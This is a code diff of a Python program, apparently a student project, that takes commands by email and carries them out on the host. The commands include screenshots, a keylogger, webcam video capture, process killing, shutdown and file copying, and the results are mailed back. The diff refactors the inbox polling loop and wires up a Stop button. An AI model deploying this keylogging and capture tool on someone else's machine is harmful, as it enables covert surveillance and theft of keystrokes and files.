@@ -8,6 +8,7 @@ import psutil
 import threading
 import cv2
 import shutil
+import keyboard
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
@@ -16,8 +17,6 @@ from email import encoders
 from pynput.keyboard import Listener 
 from tkinter import *
 from tkinter.ttk import *
-# from tkinter import ttk
-# import tkinter.ttk as exTk
 import tkinter as tk
 from tkinter import messagebox
 
@@ -25,9 +24,9 @@ from tkinter import messagebox
 email_receive = ''
 password_receive = ''
 HOST = 'imap.gmail.com'
+
 # login to receive 
-# connect to the server and go to its inbox
-RECEIVE = imaplib.IMAP4_SSL(HOST)
+receive_server = imaplib.IMAP4_SSL(HOST)
 
 # send email
 smtp_ssl_host = 'smtp.gmail.com'
@@ -35,7 +34,7 @@ smtp_ssl_port = 465
 from_addr = ''
 to_addr = ''
 # login to send 
-SEND = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
+send_server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
 
 
 PATH_SCREENSHOT = 'Material/screenshot.jpg'
@@ -43,7 +42,8 @@ PATH_CAPTUREVIDEO = 'Material/capturevideo.mp4'
 
 
 def sendMessage():
-    SEND.sendmail(from_addr, to_addr, message.as_string())
+    # send_server.ehlo()
+    send_server.sendmail(from_addr, to_addr, message.as_string())
     print('Done send\n\n')
 
 # screenshot
@@ -260,103 +260,123 @@ def copyFile(src, dst):
     message.attach(MIMEText(text))
     sendMessage()
 
-# check mail 
-def checkMail():
-    global message
-    try:
-        while (True):
-            RECEIVE.select('inbox')
-            status, data = RECEIVE.search(None, 'UNSEEN')
-            mail_ids = []
-            for block in data:
-                mail_ids += block.split()
+def sleepProgram():
+    print('sleep')
+    time.sleep(5)
+    if (keyboard.is_pressed('Esc')):
+        print(2)
 
-            for i in mail_ids:
-                status, data = RECEIVE.fetch(i, '(RFC822)')
+# if connect = 1, check mail every 5s
+def checkMail(first = True):
+    global message, connect
+    # try:
+    receive_server.select('inbox')
+    status, data = receive_server.search(None, 'UNSEEN')
+    mail_ids = []
+    for block in data:
+        mail_ids += block.split()
 
-                for response_part in data:
-                    if isinstance(response_part, tuple):
-                        msg = email.message_from_bytes(response_part[1])
+    for i in mail_ids:
+        status, data = receive_server.fetch(i, '(RFC822)')
 
-                        mail_from = msg['from']
-                        mail_subject = msg['subject']
+        for response_part in data:
+            if isinstance(response_part, tuple):
+                msg = email.message_from_bytes(response_part[1])
 
-                        if msg.is_multipart():
-                            mail_content = ''
+                mail_from = msg['from']
+                mail_subject = msg['subject']
 
-                            for part in msg.get_payload():
-                                if part.get_content_type() == 'text/plain':
-                                    mail_content += part.get_payload()
-                        else:
-                            mail_content = msg.get_payload()
-                        print(f'From: {mail_from}')
-                        print(f'Subject: {mail_subject}')
-                        print(f'Content: {mail_content}')
-                        request = mail_content.rstrip().split()
+                if msg.is_multipart():
+                    mail_content = ''
 
-                        # set infor send
-                        message = MIMEMultipart()
-                        message['From'] = from_addr
-                        message['To'] = ', '.join(to_addr)
-                        message['Subject'] = 'Subject'
+                    for part in msg.get_payload():
+                        if part.get_content_type() == 'text/plain':
+                            mail_content += part.get_payload()
+                else:
+                    mail_content = msg.get_payload()
+                print(f'From: {mail_from}')
+                print(f'Subject: {mail_subject}')
+                print(f'Content: {mail_content}')
+                request = mail_content.rstrip().split()
 
-                        # check request
-                        if (request[0] == 'screenshot'):
-                            screenshot()
-                        elif (request[0] == 'shutdown'):
-                            shutdown()
-                        elif (request[0] == 'reset'):
-                            reset()
-                        elif (request[0] == 'list' and request[1] == 'apps'):
-                            list_apps()
-                        elif (request[0] == 'list' and request[1] == 'processes'):
-                            list_processes()
-                        elif ((request[0] == 'kill') or (request[0] == 'stop')):
-                            pid = int(request[1])
-                            kill(pid)
-                        elif (request[0] == 'keylogger'):
-                            hook = request[1]
-                            keylogger(hook)
-                        elif (request[0] == 'capturevideo'):
-                            timeCap = 10 # default time
-                            if (len(request) > 1):
-                                timeCap = int(request[1])
-                            captureVideo(timeCap)
-                        elif (request[0] == 'copyfile'):
-                            copyFile(request[1], request[2])
-                        elif ((request == 'quit')):
-                            return
-            time.sleep(5)
-    except:
-        print('stop')
+                # set infor send
+                message = MIMEMultipart()
+                message['From'] = from_addr
+                message['To'] = ', '.join(to_addr)
+                message['Subject'] = 'Subject'
+
+                # check request
+                if (request[0] == 'screenshot'):
+                    screenshot()
+                elif (request[0] == 'shutdown'):
+                    shutdown()
+                elif (request[0] == 'reset'):
+                    reset()
+                elif (request[0] == 'list' and request[1] == 'apps'):
+                    list_apps()
+                elif (request[0] == 'list' and request[1] == 'processes'):
+                    list_processes()
+                elif ((request[0] == 'kill') or (request[0] == 'stop')):
+                    pid = int(request[1])
+                    kill(pid)
+                elif (request[0] == 'keylogger'):
+                    hook = request[1]
+                    keylogger(hook)
+                elif (request[0] == 'capturevideo'):
+                    timeCap = 10 # default time
+                    if (len(request) > 1):
+                        timeCap = int(request[1])
+                    captureVideo(timeCap)
+                elif (request[0] == 'copyfile'):
+                    copyFile(request[1], request[2])
+                elif ((request[0] == 'quit')):
+                    stopServer()
+                    return
+    # threading.Thread(target=sleepProgram).start()
+    print('Connect = ', connect)
+    if (connect == 0):
         return
+    window.after(5000, checkMail, True)
+    # except:
+    #     print('Error Receive or Send')
+    #     return
 
 # run server when click button Run
 def runServer(entryEmailReceiveRequest, entryPWReceiveRequest, entryEmailReceiveRespond):
-    global from_addr, to_addr, email_receive, password_receive
-    # SEND = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
+    global from_addr, to_addr, email_receive, password_receive, connect, receive_server, send_server
     email_receive = entryEmailReceiveRequest.get()
     password_receive = entryPWReceiveRequest.get()
     from_addr = email_receive
     to_addr = [entryEmailReceiveRespond.get()]
-    SEND.connect(smtp_ssl_host, smtp_ssl_port)
+
+    receive_server = imaplib.IMAP4_SSL(HOST)
+    send_server = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
+    # send_server.connect(smtp_ssl_host, smtp_ssl_port)
     try:
         # login to receive
-        RECEIVE.login(email_receive, password_receive)
+        receive_server.login(email_receive, password_receive)
+        print('login1')
         # login to send
-        SEND.login(email_receive, password_receive)
+        send_server.login(email_receive, password_receive)
+        print('login2')
+        f1.buttonRun['state'] = 'disabled'
+        f1.buttonStop['state'] = 'enable'
+        print('Run')
+        connect = 1
+        checkMail()
     except:
         print('login error')
         messagebox.showinfo('Notice', 'Email/ Password is incorrect')
-        return
-    # check mail to receive, implement, send
-    print(1)
-    checkMail()
+        f1.buttonRun['state'] = 'enable'
 
 # stop server when click button Stop
 def stopServer():
-    print('stop')
-    return
+    global connect
+    connect = 0
+    print('Stop')
+    f1.buttonStop['state'] = 'disable'
+    f1.buttonRun['state'] = 'enable'
+    # receive_server.logout()
 
 # close server when click button Close
 def closeServer():
@@ -389,7 +409,7 @@ class Main_UI(Canvas):
                                 command=lambda: runServer(self.entryEmailReceiveRequest,
                                                           self.entryPWReceiveRequest,
                                                           self.entryEmailReceiveRespond))
-        #self.buttonStop = Button(self, text = 'Stop', command = stopServer)
+        self.buttonStop = Button(self, text = 'Stop', command = stopServer, state = 'disable')
         self.buttonExit = Button(self, text = 'Exit', command = closeServer)
 
         self.labelGmailReceiveRequest.grid(row = 0, column = 0, pady=5)
@@ -401,7 +421,7 @@ class Main_UI(Canvas):
         self.labelEmailReceiveRespond.grid(row = 4, column = 0, pady=5)
         self.entryEmailReceiveRespond.grid(row = 4, column = 1, pady=5)
         self.buttonRun.grid(row = 5, column = 1, pady=5, sticky = 'w')
-        #self.buttonStop.grid(row = 5, column = 1, pady=5)
+        self.buttonStop.grid(row = 5, column = 1, pady=5)
         self.buttonExit.grid(row = 5, column = 1, sticky = 'e')
 
 # UI server
@@ -411,7 +431,8 @@ window.geometry('500x200')
 window.resizable(width=False, height=False)
 f1 = Main_UI(window)
 f1.place(x = 0, y = 0)
-
+# if (keyboard.is_pressed('Esc')):
+#     print(2)
 # close program
-SEND.quit()
+send_server.quit()
 window.mainloop()
